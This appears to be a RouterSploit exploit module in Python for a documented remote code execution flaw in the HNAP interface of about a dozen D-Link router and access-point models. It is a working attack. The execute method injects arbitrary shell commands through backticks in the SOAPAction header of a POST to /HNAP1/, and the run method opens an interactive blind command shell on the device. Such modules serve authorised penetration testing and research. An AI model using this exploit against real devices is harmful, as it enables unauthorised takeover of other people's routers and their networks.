from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link Multi HNAP RCE",
        "description": "Module exploits HNAP remote code execution vulnerability in multiple D-Link "
                       "devices which allows executing commands on the device.",
        "authors": (
            "Samuel Huntley",  # vulnerability discovery
            "Craig Heffner",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/37171/",
            "https://www.exploit-db.com/exploits/38722/",
            "http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/",
        ),
        "devices": (
            "D-Link DIR-645",
            "D-Link AP-1522 revB",
            "D-Link DAP-1650 revB",
            "D-Link DIR-880L",
            "D-Link DIR-865L",
            "D-Link DIR-860L revA",
            "D-Link DIR-860L revB",
            "D-Link DIR-815 revB",
            "D-Link DIR-300 revB",
            "D-Link DIR-600 revB",
            "D-Link DIR-645",
            "D-Link TEW-751DR",
            "D-Link TEW-733GR",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_status("Target might be vulnerable - it is hard to verify")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd_new = "cd && cd tmp && export PATH=$PATH:. && {}".format(cmd)
        soap_action = '"http://purenetworks.com/HNAP1/GetDeviceSettings/`{}`"'.format(cmd_new)
        headers = {"SOAPAction": soap_action}

        self.http_request(
            method="POST",
            path="/HNAP1/",
            headers=headers
        )
        return ""

    @mute
    def check(self):
        headers = {"SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings"'}

        response = self.http_request(
            method="GET",
            path="/HNAP1/",
            headers=headers
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "D-Link" in response.text and "SOAPActions" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
